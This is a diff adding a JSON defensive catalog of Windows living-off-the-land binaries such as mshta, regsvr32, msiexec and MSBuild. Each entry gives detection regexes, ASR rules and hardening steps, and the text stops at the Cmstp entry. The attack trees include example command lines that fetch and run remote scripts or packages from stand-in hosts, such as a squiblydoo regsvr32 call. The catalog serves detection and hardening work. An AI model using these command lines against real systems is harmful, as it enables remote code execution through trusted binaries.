@@ -1,0 +1,2150 @@
+{
+    "version":  "2026.11.3",
+    "scope":  "Defensive catalog of publicly documented living-off-the-land execution primitives. Probes are inert; no payloads, no persistence, no network.",
+    "taxonomy":  "group and method name the defensive family; platform separates Windows from Linux/Unix.",
+    "techniques":  [
+                       {
+                           "id":  "T1218.005",
+                           "name":  "Mshta",
+                           "host":  "mshta.exe",
+                           "path":  "C:\\Windows\\System32\\mshta.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "high",
+                           "abuse":  "Runs HTML applications and embedded VBScript or JScript, including content referenced by URL, UNC path or script: moniker.",
+                           "probe":  "Inventory only; optional inert marker probe.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 3/22 network",
+                                             "AMSI script content"
+                                         ],
+                           "detection":  "mshta with http, https, UNC, file, script: or vbscript: arguments. mshta spawning powershell, wscript, cscript, cmd or rundll32. Network connections from mshta.",
+                           "hardening":  [
+                                             "Block mshta with WDAC or AppLocker if it is not required.",
+                                             "Enable ASR rule Block executable content from email and webmail."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "content",
+                                         "network"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "amsi",
+                                            "applocker",
+                                            "wdac",
+                                            "asr"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "a":  "User opens an HTA attachment or a link to one",
+                                            "s":  "Delivery",
+                                            "t":  "T1566.001",
+                                            "c":  "",
+                                            "d":  "Sysmon 11/15; 4688 parent",
+                                            "p":  "outlook.exe -\u003e attachment.hta"
+                                        },
+                                        {
+                                            "a":  "Signed binary parses remote HTA and runs the script inside itself",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.005",
+                                            "c":  "mshta.exe https://example.com/notice.hta",
+                                            "d":  "4688 + cmdline; Sysmon 1; AMSI",
+                                            "p":  "mshta.exe"
+                                        },
+                                        {
+                                            "a":  "HTA starts a shell to stage the next step",
+                                            "s":  "Child process",
+                                            "t":  "T1059.001",
+                                            "c":  "powershell.exe -NoProfile -WindowStyle Hidden -Command \"...\"",
+                                            "d":  "4688 parent=mshta; Sysmon 1",
+                                            "p":  "mshta.exe -\u003e powershell.exe"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "mshta.exe -\u003e 203.0.113.10:443",
+                                            "d":  "Sysmon 3/22; firewall 5156",
+                                            "a":  "Download or beacon over HTTPS"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "mshta should not accept remote content or a script: moniker in normal use.",
+                                       "m":  [
+                                                 "mshta(\\.exe)?\\s+https?://",
+                                                 "mshta(\\.exe)?\\s+\\\\\\\\",
+                                                 "mshta(\\.exe)?\\s+(vbscript|javascript):",
+                                                 "ParentImage.*mshta"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable content from email client and webmail",
+                                           "g":  "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550"
+                                       },
+                                       {
+                                           "n":  "Block JavaScript or VBScript from launching downloaded executable content",
+                                           "g":  "D3E037E1-3EB8-44C8-A917-57927947596D"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Any outbound 80/443 from mshta.exe is abnormal. Alert on first connection and keep the destination.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Block mshta.exe with AppLocker or WDAC unless a line-of-business app needs it.",
+                                       "Enable the two ASR rules in block mode.",
+                                       "Turn on 4688 command-line auditing and Sysmon 1 so the parent chain is visible.",
+                                       "Remove the .hta association for standard users."
+                                   ]
+                       },
+                       {
+                           "id":  "T1059.005",
+                           "name":  "Windows Script Host - VBScript",
+                           "host":  "wscript.exe",
+                           "path":  "C:\\Windows\\System32\\wscript.exe",
+                           "family":  "Command and scripting interpreter",
+                           "platform":  "windows",
+                           "group":  "Script Hosts",
+                           "method":  "Interpreter",
+                           "risk":  "high",
+                           "abuse":  "Runs .vbs, .vbe and .wsf files through the Windows Script Host, including remote or user-writable paths.",
+                           "probe":  "Optional inert marker probe.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "AMSI script content"
+                                         ],
+                           "detection":  "wscript started from temp, downloads or user-writable paths. wscript spawning powershell, cmd, mshta or rundll32. Script arguments containing URLs.",
+                           "hardening":  [
+                                             "If VBScript is not needed, block wscript and cscript with WDAC or AppLocker.",
+                                             "Set the Windows Script Host Enabled policy to 0 on managed hosts that do not require it."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "content"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "amsi",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "a":  "User opens a script attachment or archive member",
+                                            "s":  "Delivery",
+                                            "t":  "T1566.001",
+                                            "c":  "",
+                                            "d":  "Sysmon 11; Zone.Identifier",
+                                            "p":  "browser/outlook -\u003e file.vbs"
+                                        },
+                                        {
+                                            "a":  "Windows Script Host runs VBScript from disk or a share",
+                                            "s":  "Execution",
+                                            "t":  "T1059.005",
+                                            "c":  "wscript.exe //B //Nologo \"%TEMP%\\invoice.vbs\"",
+                                            "d":  "4688 + cmdline; Sysmon 1; AMSI",
+                                            "p":  "wscript.exe"
+                                        },
+                                        {
+                                            "a":  "Script shells out to run built-in tools",
+                                            "s":  "Child process",
+                                            "t":  "T1059.003",
+                                            "c":  "cmd.exe /c ...",
+                                            "d":  "4688 parent=wscript; Sysmon 1",
+                                            "p":  "wscript.exe -\u003e cmd.exe"
+                                        },
+                                        {
+                                            "t":  "T1105",
+                                            "s":  "Egress",
+                                            "p":  "cmd.exe -\u003e 203.0.113.20:80",
+                                            "d":  "Sysmon 3/22; 5156",
+                                            "a":  "Fetch the next stage"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "Normal logon scripts run from a fixed path. Script hosts launching shells or download tools are the pattern to catch.",
+                                       "m":  [
+                                                 "wscript(\\.exe)?\\s+//[Bb]",
+                                                 "wscript(\\.exe)?\\s+.*\\.(vbs|vbe|js|jse|wsf)\\b",
+                                                 "ParentImage.*wscript",
+                                                 "wscript.*(powershell|cmd|mshta|certutil)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable content from email client and webmail",
+                                           "g":  "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550"
+                                       },
+                                       {
+                                           "n":  "Block all Office applications from creating child processes",
+                                           "g":  "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Warn on any wscript.exe egress; it has no legitimate reason to reach the internet on a workstation.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Set WSH Enabled=0 by policy if no logon script needs it.",
+                                       "Block wscript.exe through AppLocker script rules.",
+                                       "Enable 4688 cmdline and AMSI so the script body is visible.",
+                                       "Alert on wscript.exe children outside the logon-script window."
+                                   ]
+                       },
+                       {
+                           "id":  "T1059.007",
+                           "name":  "Windows Script Host - JScript",
+                           "host":  "cscript.exe",
+                           "path":  "C:\\Windows\\System32\\cscript.exe",
+                           "family":  "Command and scripting interpreter",
+                           "platform":  "windows",
+                           "group":  "Script Hosts",
+                           "method":  "Interpreter",
+                           "risk":  "high",
+                           "abuse":  "Runs .js and .jse files through the console script host.",
+                           "probe":  "Optional inert marker probe.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "AMSI script content"
+                                         ],
+                           "detection":  "cscript with //E:jscript, remote paths or temp paths. cscript spawning powershell, cmd or mshta.",
+                           "hardening":  [
+                                             "Block cscript with WDAC or AppLocker if JavaScript is not required.",
+                                             "Prefer allow-listing over blocking individual extensions."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "content"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "amsi",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e file.js",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Script lands in a temp or user-writable path"
+                                        },
+                                        {
+                                            "a":  "Console script host runs JScript",
+                                            "s":  "Execution",
+                                            "t":  "T1059.007",
+                                            "c":  "cscript.exe //E:jscript //Nologo \"%TEMP%\\run.js\"",
+                                            "d":  "4688 + cmdline; Sysmon 1; AMSI",
+                                            "p":  "cscript.exe"
+                                        },
+                                        {
+                                            "t":  "T1059.003",
+                                            "s":  "Discovery",
+                                            "p":  "cscript.exe -\u003e cmd.exe",
+                                            "d":  "4688; Sysmon 1",
+                                            "a":  "Script runs whoami, ipconfig, net view"
+                                        },
+                                        {
+                                            "t":  "T1105",
+                                            "s":  "Egress",
+                                            "p":  "cscript.exe -\u003e 203.0.113.21:443",
+                                            "d":  "Sysmon 22; 5156",
+                                            "a":  "Script performs the download itself"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "cscript in a user path, especially with //E, is a scripting-host execution signal.",
+                                       "m":  [
+                                                 "cscript(\\.exe)?\\s+//E:(jscript|vbscript)",
+                                                 "cscript(\\.exe)?\\s+.*\\.(js|jse|vbs|wsf)\\b",
+                                                 "ParentImage.*cscript"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block JavaScript or VBScript from launching downloaded executable content",
+                                           "g":  "D3E037E1-3EB8-44C8-A917-57927947596D"
+                                       },
+                                       {
+                                           "n":  "Block execution of potentially obfuscated scripts",
+                                           "g":  "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "cscript.exe opening a socket is rare in managed environments; alert and capture the destination and bytes out.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Disable WSH by policy where scripts are not required.",
+                                       "Block script extensions in AppLocker Executable and Script rules.",
+                                       "Enable PowerShell and AMSI telemetry to capture script content.",
+                                       "Alert on cscript.exe with a non-system script path."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.011",
+                           "name":  "Rundll32",
+                           "host":  "rundll32.exe",
+                           "path":  "C:\\Windows\\System32\\rundll32.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "high",
+                           "abuse":  "Calls exported DLL functions and can reach script engines through url.dll or mshtml, including javascript: and vbscript: arguments.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 7 image load"
+                                         ],
+                           "detection":  "rundll32 with javascript:, vbscript:, shell32.dll,Control_RunDLL or ordinal exports. DLLs loaded from temp or downloads. rundll32 with no arguments from an Office process.",
+                           "hardening":  [
+                                             "Block rundll32 only where it is not needed by installed software.",
+                                             "Use WDAC to restrict DLLs that may be loaded by signed system binaries."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "document -\u003e dropper",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Dropper or macro writes a DLL or scriptlet"
+                                        },
+                                        {
+                                            "a":  "Runs an export, an ordinal or a remote scriptlet",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.011",
+                                            "c":  "rundll32.exe C:\\Users\\Public\\example.dll,Start",
+                                            "d":  "4688 + cmdline; Sysmon 1; Sysmon 7 image load",
+                                            "p":  "rundll32.exe"
+                                        },
+                                        {
+                                            "t":  "T1055",
+                                            "s":  "Injection/child",
+                                            "p":  "rundll32.exe -\u003e powershell.exe",
+                                            "d":  "Sysmon 1, 8, 10; 4688",
+                                            "a":  "DLL runs code in the host and spawns a shell"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "rundll32.exe -\u003e 203.0.113.30:443",
+                                            "d":  "Sysmon 3/22",
+                                            "a":  "Beacon from a process that should not have a network role"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "Ordinal-only exports, javascript: prefixes and DLLs from user-writable paths are the classic rundll32 abuse shapes.",
+                                       "m":  [
+                                                 "rundll32(\\.exe)?\\s+.*,\\s*#\\d+",
+                                                 "rundll32(\\.exe)?\\s+javascript:",
+                                                 "rundll32(\\.exe)?\\s+.*\\.(dll|ocx)\\s*,",
+                                                 "rundll32(\\.exe)?\\s+.*\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.dll"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block all Office applications from creating child processes",
+                                           "g":  "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+                                       },
+                                       {
+                                           "n":  "Block Office applications from injecting code into other processes",
+                                           "g":  "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84"
+                                       },
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Track rundll32.exe egress and DLL loads from user paths. The combination is the indicator.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Enable ASR Office child-process and code-injection rules.",
+                                       "Alert on rundll32 with ordinal exports or user-path DLLs.",
+                                       "Use WDAC to allow only signed DLLs from system paths.",
+                                       "Keep Sysmon 7 (image load) enabled to catch the DLL."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.010",
+                           "name":  "Regsvr32",
+                           "host":  "regsvr32.exe",
+                           "path":  "C:\\Windows\\System32\\regsvr32.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "high",
+                           "abuse":  "Squiblydoo: /s /n /u /i:URL scrobj.dll loads a remote scriptlet through the COM scriptlet engine.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 3/22 network"
+                                         ],
+                           "detection":  "regsvr32 with scrobj.dll, /i:http, /i:https or /i:\\\\ paths. Network connections from regsvr32. regsvr32 spawning script hosts.",
+                           "hardening":  [
+                                             "Enable ASR rule Block process creations originating from PSExec and WMI commands where applicable.",
+                                             "Restrict outbound HTTP from system binaries with egress filtering."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "network"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "link or document",
+                                            "d":  "Sysmon 22; proxy logs",
+                                            "a":  "User is pointed at a remote scriptlet"
+                                        },
+                                        {
+                                            "a":  "Registers a remote COM scriptlet (squiblydoo)",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.010",
+                                            "c":  "regsvr32.exe /s /n /u /i:https://example.com/example.sct scrobj.dll",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "regsvr32.exe"
+                                        },
+                                        {
+                                            "a":  "Scriptlet runs JScript inside regsvr32",
+                                            "s":  "Script execution",
+                                            "t":  "T1059.007",
+                                            "c":  "",
+                                            "d":  "AMSI; 4104 if present",
+                                            "p":  "regsvr32.exe -\u003e scriptlet"
+                                        },
+                                        {
+                                            "t":  "T1105",
+                                            "s":  "Egress",
+                                            "p":  "regsvr32.exe -\u003e 203.0.113.31:443",
+                                            "d":  "Sysmon 22; 5156",
+                                            "a":  "Second stage fetched in the same process"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "regsvr32 with /i: pointing at a URL or scrobj.dll is the documented squiblydoo pattern.",
+                                       "m":  [
+                                                 "regsvr32(\\.exe)?\\s+.*(/i:|/u\\s+/i:)",
+                                                 "regsvr32(\\.exe)?\\s+.*scrobj\\.dll",
+                                                 "regsvr32(\\.exe)?\\s+.*https?://"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable content from email client and webmail",
+                                           "g":  "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550"
+                                       },
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Alert on regsvr32.exe egress, especially to a host that also served the .sct reference.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Block regsvr32.exe for standard users via AppLocker.",
+                                       "Enable ASR block on untrusted executables.",
+                                       "Log 4688 with cmdline and alert on /i: with a URL.",
+                                       "Restrict outbound traffic from system binaries that never need it."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.007",
+                           "name":  "Msiexec",
+                           "host":  "msiexec.exe",
+                           "path":  "C:\\Windows\\System32\\msiexec.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "high",
+                           "abuse":  "Installs packages from remote URLs, runs DLLs with /y and applies transforms that can execute code.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 3/22 network",
+                                             "MSI installer log"
+                                         ],
+                           "detection":  "msiexec /i with http or UNC paths. msiexec with /q /n and no visible installer. msiexec spawning rundll32, cmd or powershell.",
+                           "hardening":  [
+                                             "Disable installation of packages from untrusted locations with AppLocker or WDAC.",
+                                             "Enable installer logging and centralize MSI operational events."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "network"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "link -\u003e package.msi",
+                                            "d":  "Sysmon 11; proxy",
+                                            "a":  "User is sent an MSI link or attachment"
+                                        },
+                                        {
+                                            "a":  "Installs a remote or user-path MSI quietly",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.007",
+                                            "c":  "msiexec.exe /q /i https://example.com/package.msi",
+                                            "d":  "4688 + cmdline; Sysmon 1; MSI log",
+                                            "p":  "msiexec.exe"
+                                        },
+                                        {
+                                            "t":  "T1059.003",
+                                            "s":  "Custom action",
+                                            "p":  "msiexec.exe -\u003e cmd.exe",
+                                            "d":  "4688 parent=msiexec; Sysmon 1",
+                                            "a":  "Custom action runs a command"
+                                        },
+                                        {
+                                            "t":  "T1105",
+                                            "s":  "Egress",
+                                            "p":  "msiexec.exe -\u003e 203.0.113.40:443",
+                                            "d":  "Sysmon 22; 5156",
+                                            "a":  "Package or payload fetched from the internet"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "Quiet MSI installs from a URL or a user-writable path are the abuse shape.",
+                                       "m":  [
+                                                 "msiexec(\\.exe)?\\s+.*(/q|/quiet).*(/i|/package)\\s+https?://",
+                                                 "msiexec(\\.exe)?\\s+.*\\\\\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.msi",
+                                                 "ParentImage.*msiexec"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable content from email client and webmail",
+                                           "g":  "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550"
+                                       },
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Watch msiexec.exe fetching an MSI over HTTP(S) and any child process it starts.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Require signed MSI packages through AppLocker or WDAC.",
+                                       "Alert on msiexec with a URL argument or a user-path package.",
+                                       "Log 4688 cmdline and MSI installer events.",
+                                       "Disable MSI installs for standard users where possible."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.004",
+                           "name":  "InstallUtil",
+                           "host":  "installutil.exe",
+                           "path":  "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "high",
+                           "abuse":  "Runs .NET assemblies through the InstallUtil helper, including code in Install and Uninstall methods.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             ".NET runtime events"
+                                         ],
+                           "detection":  "installutil with /logfile=, /LogToConsole=false or /U. installutil loading assemblies from temp or downloads.",
+                           "hardening":  [
+                                             "Block installutil with WDAC or AppLocker if development tooling is not needed on the host.",
+                                             "Restrict .NET assembly execution paths."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e assembly.exe",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Compiled assembly is dropped"
+                                        },
+                                        {
+                                            "a":  "Runs managed code through the installer utility",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.004",
+                                            "c":  "installutil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\example.exe",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "installutil.exe"
+                                        },
+                                        {
+                                            "a":  "Assembly executes in the signed host",
+                                            "s":  "Assembly load",
+                                            "t":  "T1218.004",
+                                            "c":  "",
+                                            "d":  "Sysmon 7; .NET runtime events",
+                                            "p":  "installutil.exe -\u003e example.exe"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "installutil.exe -\u003e 203.0.113.41:443",
+                                            "d":  "Sysmon 3/22",
+                                            "a":  "Managed payload beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "InstallUtil with suppressed logging and a user-path assembly is the documented abuse flag set.",
+                                       "m":  [
+                                                 "installutil(\\.exe)?\\s+.*(/logfile=|/LogToConsole=false)",
+                                                 "installutil(\\.exe)?\\s+.*\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.(exe|dll)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       },
+                                       {
+                                           "n":  "Block all Office applications from creating child processes",
+                                           "g":  "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Any egress from installutil.exe is abnormal outside a maintenance window.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Remove InstallUtil use where .NET installers are not needed.",
+                                       "Alert on /logfile= with /LogToConsole=false.",
+                                       "Enable Sysmon 7 and .NET runtime logging.",
+                                       "AppLocker allow-list for developer binaries."
+                                   ]
+                       },
+                       {
+                           "id":  "T1127.001",
+                           "name":  "MSBuild",
+                           "host":  "msbuild.exe",
+                           "path":  "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+                           "family":  "Trusted developer utilities proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Developer utility",
+                           "risk":  "high",
+                           "abuse":  "Executes inline tasks defined in a project file.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "MSBuild building projects from temp, downloads or user-writable paths. MSBuild spawning csc, powershell or cmd.",
+                           "hardening":  [
+                                             "Remove MSBuild from general-purpose hosts where it is not needed.",
+                                             "Block project files from untrusted locations with WDAC."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "content"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e project.csproj",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Project file with an inline task lands on disk"
+                                        },
+                                        {
+                                            "a":  "MSBuild compiles and runs inline C#",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1127.001",
+                                            "c":  "msbuild.exe C:\\Users\\Public\\example.csproj",
+                                            "d":  "4688 + cmdline; Sysmon 1; .NET runtime",
+                                            "p":  "msbuild.exe"
+                                        },
+                                        {
+                                            "t":  "T1059.003",
+                                            "s":  "Child process",
+                                            "p":  "msbuild.exe -\u003e cmd.exe",
+                                            "d":  "4688 parent=msbuild; Sysmon 1",
+                                            "a":  "Inline task spawns a command"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "msbuild.exe -\u003e 203.0.113.42:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Build host beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "MSBuild on a project in a user-writable path, outside a build agent, is the signal.",
+                                       "m":  [
+                                                 "msbuild(\\.exe)?\\s+.*\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.(csproj|proj|xml)",
+                                                 "msbuild(\\.exe)?\\s+.*(/p:|/t:)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       },
+                                       {
+                                           "n":  "Block all Office applications from creating child processes",
+                                           "g":  "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Egress from msbuild.exe on a workstation is abnormal; alert with the project path.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Allow MSBuild only on build hosts, block elsewhere with AppLocker.",
+                                       "Alert on project files under user profiles.",
+                                       "Enable 4688 cmdline and .NET runtime logging.",
+                                       "Keep Sysmon 1 and 11 for the project file and child chain."
+                                   ]
+                       },
+                       {
+                           "id":  "T1047",
+                           "name":  "Windows Management Instrumentation",
+                           "host":  "wmic.exe",
+                           "path":  "C:\\Windows\\System32\\wbem\\wmic.exe",
+                           "family":  "Windows Management Instrumentation",
+                           "platform":  "windows",
+                           "group":  "Management Interfaces",
+                           "method":  "WMI",
+                           "risk":  "high",
+                           "abuse":  "Creates processes locally or remotely, and can load XSL transforms.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "WMI operational log",
+                                             "Sysmon 19/20/21 WMI events"
+                                         ],
+                           "detection":  "wmic process call create, /node: remote targets, format:http or format:\\\\ paths. WMI-created children of wmiprvse.exe.",
+                           "hardening":  [
+                                             "Restrict remote WMI with firewall rules and least privilege.",
+                                             "Monitor WMI activity with Sysmon 19, 20 and 21."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "document/script",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Loader writes an XSL or command"
+                                        },
+                                        {
+                                            "a":  "WMI spawns a process or formats a remote XSL",
+                                            "s":  "Execution",
+                                            "t":  "T1047",
+                                            "c":  "wmic.exe process call create \"cmd.exe /c ...\"",
+                                            "d":  "4688 + cmdline; Sysmon 1; WMI-Activity",
+                                            "p":  "wmic.exe"
+                                        },
+                                        {
+                                            "t":  "T1047",
+                                            "s":  "Lateral movement",
+                                            "p":  "wmic.exe -\u003e remote host",
+                                            "d":  "WMI-Activity; 4688 on target; 5156",
+                                            "a":  "Same command aimed at a peer over DCOM/RPC"
+                                        },
+                                        {
+                                            "t":  "T1546.003",
+                                            "s":  "Persistence",
+                                            "p":  "WMI event subscription",
+                                            "d":  "Sysmon 19/20/21",
+                                            "a":  "Command registers a permanent consumer"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "wmic process call create and remote /node: use are the high-value patterns; wmic is deprecated but still present.",
+                                       "m":  [
+                                                 "wmic(\\.exe)?\\s+process\\s+call\\s+create",
+                                                 "wmic(\\.exe)?\\s+.*(/node:|/format:)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block process creations originating from PSExec and WMI commands",
+                                           "g":  "D1E49AAC-8F56-4280-B9BA-993A6D77406C"
+                                       },
+                                       {
+                                           "n":  "Block persistence through WMI event subscription",
+                                           "g":  "E6DB77E5-3DF2-4CF1-B95A-636979351E5B"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Watch RPC 135 and dynamic RPC ports from wmic.exe toward peers; this is the lateral-movement leg.",
+                                       "ports":  "135,49152-65535"
+                                   },
+                           "fix":  [
+                                       "Enable ASR block for PSExec and WMI process creation.",
+                                       "Alert on permanent WMI consumers.",
+                                       "Restrict RPC between workstations at the network layer.",
+                                       "Remove wmic.exe where the environment does not need it."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.003",
+                           "name":  "Cmstp",
+                           "host":  "cmstp.exe",
